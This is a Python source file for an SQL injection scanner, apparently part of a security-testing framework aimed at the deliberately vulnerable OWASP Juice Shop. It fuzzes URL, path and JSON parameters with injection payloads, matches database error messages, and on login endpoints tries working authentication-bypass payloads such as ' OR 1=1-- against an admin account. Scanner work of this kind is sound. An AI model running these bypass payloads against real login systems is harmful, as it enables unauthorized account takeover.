import logging
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from core.models import HttpClient, Method, RawFinding, Evidence


class SQLiScanner:
    def __init__(self):
        self.payloads = [
            # Базові символи, що ламають синтаксис
            "'", "\"", "`", "\\", ";",

            # Дужки, що порушують логіку запиту
            ")", "(", "}", "{", "]", "[",

            # Комбінації лапок і дужок
            "')", "\")", "`)", "'))", "\"))", "')",

            # Комбінації з коментарями
            "';--", "\";--", "';#", "\";#", "/*", "*/",

            # Математичні та логічні символи (провокація помилок типів або ділення на нуль)
            "||", "+", "-", "*", "/", "/0", "=", ">", "<",

            # Специфічні конструкції для помилок конвертації типів
            "@@version", "user()", "convert(int,@@version)", "cast(@@version as int)"
        ]

        self.error_signatures = [
            # MySQL / MariaDB
            "SQL syntax",
            "mysql_fetch_array()",
            "mysql_fetch_assoc()",
            "mysql_fetch_object()",
            "mysql_num_rows()",
            "Warning: mysql_",
            "MySQL Error",
            "MariaDB server version for the right syntax",
            "check the manual that corresponds to your MySQL",

            # PostgreSQL
            "PostgreSQL query failed",
            "syntax error at or near",
            "PG::SyntaxError",
            "valid PostgreSQL result",
            "Npgsql.",
            "PostgreSQL Error",
            "unterminated quoted string",

            # Microsoft SQL Server (MSSQL)
            "Unclosed quotation mark",
            "SQL Server error",
            "Driver][SQL Server]",
            "Microsoft OLE DB Provider for SQL Server",
            "Incorrect syntax near",
            "SqlException",
            "SQLServer JDBC Driver",
            "Conversion failed when converting the",

            # Oracle
            "ORA-00933",
            "ORA-01033",
            "ORA-",
            "Oracle error",
            "PLS-",
            "java.sql.SQLException: ORA-",
            "Oracle ODBC",
            "quoted string not properly terminated",

            # SQLite
            "SQLite/JDBCDriver",
            "SQLite.Exception",
            "System.Data.SQLite.SQLiteException",
            "unrecognized token:",
            "no such table:",
            "SQL logic error",

            # Generic / Інші (ODBC, DB2, Sybase, Access)
            "CLI Driver",
            "DB2 SQL error",
            "ODBC SQL Server Driver",
            "Sybase message",
            "JDBC Driver",
            "java.sql.SQLException",
            "Syntax error in string in query expression",
            "Microsoft Access Driver"
        ]

        # Juice shop uses SQLite and Sequelize
        self.error_signatures.extend(["SQLITE_ERROR", "SequelizeDatabaseError", "sequelize/lib/", "sqlite/query.js"])
        self.common_parameters = ["id", "cat", "artist", "q", "search", "query", "user", "email"]
        self.common_json_keys = ["email", "password", "username", "id", "search", "token"]
        self.post_endpoints_keywords = ["login", "register", "auth", "user", "profile", "basket", "checkout"]

    async def execute(self, http_client: HttpClient, target_url: str):
        findings = []
        # 1. Fuzz Query Parameters
        parsed_url = urlparse(target_url)
        original_query_params = parse_qs(parsed_url.query)
        params_to_test = list(original_query_params) or self.common_parameters

        for param in params_to_test:
            for payload in self.payloads:
                try:
                    query_params = parse_qs(parsed_url.query)
                    query_params[param] = [payload]
                    new_query = urlencode(query_params, doseq=True)
                    test_url = urlunparse(parsed_url._replace(query=new_query))

                    if await self._test_url(http_client, test_url, param, findings):
                        break  # Found injection for this parameter, stop fuzzing payloads
                except Exception as e:
                    logging.error(f"Error: {e} on payload: {payload} in query")

        # 2. Fuzz Path Parameters (e.g., /rest/basket/${e}/)
        import re
        path_vars = re.findall(r'\$\{[^}]+\}', target_url)
        
        for path_var in path_vars:
            for payload in self.payloads:
                try:
                    # Replace the targeted variable with payload, and others with safe defaults
                    safe_url = target_url
                    for other_var in path_vars:
                        if other_var != path_var:
                            safe_url = safe_url.replace(other_var, "1") # Safe default
                    
                    test_url = safe_url.replace(path_var, payload)
                    
                    if await self._test_url(http_client, test_url, path_var, findings):
                        break # Found injection for this path variable, stop fuzzing payloads
                except Exception as e:
                    logging.error(f"Error: {e} on payload: {payload} in path")

        # 3. Fuzz POST JSON Body
        is_post_target = any(keyword in target_url.lower() for keyword in self.post_endpoints_keywords)
        if is_post_target:
            for key in self.common_json_keys:
                for payload in self.payloads:
                    try:
                        # Build a flat JSON payload
                        json_body = {k: "test" for k in self.common_json_keys}
                        json_body[key] = payload
                        
                        if await self._test_post_json(http_client, target_url, json_body, key, findings):
                            break # Found injection, stop fuzzing payloads for this key
                    except Exception as e:
                        logging.error(f"Error: {e} on payload: {payload} in POST JSON")

        return findings

    async def _test_post_json(self, http_client, test_url, json_body, param_name, findings_list) -> bool:
        """Sends a POST request with JSON body and checks for SQLi signatures. Returns True if found."""
        response = await http_client.request(Method.POST, path=test_url, json=json_body)
        found = next((signature for signature in self.error_signatures if signature in response.body), None)
        if found:
            # We found an error. Now let's try to exploit it if it's a login endpoint.
            if "login" in test_url.lower():
                if await self._attempt_auth_bypass_poc(http_client, test_url, findings_list):
                    return True # Successfully exploited, no need to log the error-based one
                    
            findings_list.append(RawFinding(
                vuln_id="INJ-SQLI-ERROR-BASED",
                endpoint=test_url,
                evidence=Evidence(
                    request=f"POST {test_url}\n{json_body}",
                    response=found,
                    parameters=[param_name],
                )
            ))
            return True
        return False

    async def _test_url(self, http_client, test_url, param_name, findings_list) -> bool:
        """Sends the request and checks for SQLi signatures. Returns True if found."""
        response = await http_client.request(Method.GET, path=test_url)
        found = next((signature for signature in self.error_signatures if signature in response.body), None)
        if found:
            findings_list.append(RawFinding(
                vuln_id="INJ-SQLI-ERROR-BASED",
                endpoint=test_url,
                evidence=Evidence(
                    request=f"GET {test_url}",
                    response=found,
                    parameters=[param_name],
                )
            ))
            return True
        return False
        
    async def _attempt_auth_bypass_poc(self, http_client, test_url, findings_list) -> bool:
        """Attempts an active Authentication Bypass using common SQLi payloads."""
        bypass_payloads = [
            "'--",
            "' OR 1=1--",
            "' OR '1'='1"
        ]
        
        # Typically the vulnerable parameter in login is email or username
        for payload in bypass_payloads:
            json_body = {
                "email": f"admin@juice-sh.op{payload}", 
                "password": "a"
            }
            try:
                response = await http_client.request(Method.POST, path=test_url, json=json_body)
                
                # Check if we bypassed auth (HTTP 200 and 'token' in response)
                if response.code == 200 and "token" in response.body.lower():
                    findings_list.append(RawFinding(
                        vuln_id="INJ-SQLI-AUTH-BYPASS",
                        endpoint=test_url,
                        evidence=Evidence(
                            request=f"POST {test_url}\n{json_body}",
                            response=f"HTTP/1.1 200 OK\n\n{response.body[:300]}... [TOKEN EXTRACTED]",
                            parameters=["email"]
                        )
                    ))
                    return True
            except Exception as e:
                logging.error(f"Error during PoC attempt: {e}")
                
        return False
